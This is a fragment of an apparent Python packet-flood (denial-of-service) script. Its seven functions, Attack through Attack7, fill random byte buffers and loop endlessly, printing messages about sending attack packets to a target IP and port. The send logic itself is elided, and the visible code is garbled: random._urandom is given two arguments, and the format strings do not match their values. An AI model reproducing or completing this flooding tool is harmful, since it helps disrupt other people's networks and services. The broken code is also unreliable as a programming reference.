...
def Attack():
	bytes = random._urandom(10000,1024)
	...
	while True:
		try:
			...
			print(M +"Sent Attack Started %s packet to %s throught port:%s"%(ip,port))
		except:
			s.close()
			print(" [K] Sent Attack Started %s packet to %s throught port:%s"%(ip,port))

def Attack2():
	bytes = random._urandom(21372,37682)
...
def Attack3():
	bytes = random._urandom(37682,4096)
...
def Attack4():
	bytes = random._urandom(20000,2000)
	data = random._urandom(696969)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
...
def Attack5():
	bytes = random._urandom(16,65534)
...
def Attack6():
	bytes = random._urandom(400,12345)
...
def Attack7():
	bytes = random._urandom(65534,577)
	data = random._urandom(577)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
